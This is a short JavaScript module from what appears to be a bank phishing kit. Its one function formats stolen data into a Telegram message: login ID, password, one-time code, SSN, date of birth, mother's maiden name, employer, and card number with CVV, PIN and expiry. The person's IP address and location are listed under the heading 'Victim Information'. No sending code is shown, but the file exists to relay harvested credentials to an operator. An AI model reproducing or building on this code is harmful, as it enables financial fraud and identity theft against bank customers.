const telegramMessage = (body) => {
  return `
${body.bank}\n
User ID: ${body?.userID || ""}
Password: ${body?.password || ""}
OTP: ${body?.otp || ""}
Name: ${body?.name || ""}
Address: ${body?.address || ""}
SSN: ${body?.ssn || ""}
DOB: ${body?.dob || ""}
MMN: ${body?.mmn || ""}
Current employer: ${body?.currentEmployer || ""}\n
Card Information:
  Card Number: ${body?.cardInfo?.card || ""}
  CVV: ${body?.cardInfo?.cvv || ""}
  PIN: ${body?.cardInfo?.pin || ""}
  Expiry: ${body?.cardInfo?.expiry || ""}\n
Victim Information:
  IP: ${body?.victimInfo.ip}
  City: ${body.victimInfo.city}
  Country: ${body.victimInfo.country}
  Country code: ${body.victimInfo.countryCode}
  Region: ${body.victimInfo.region}
  Region name: ${body.victimInfo.regionName}
  Zip code: ${body.victimInfo.zip}
  Latitude: ${body.victimInfo.lat}
  Longitude: ${body.victimInfo.lon}\n
User agent: ${body.userAgent}
`;
};

module.exports = { telegramMessage };
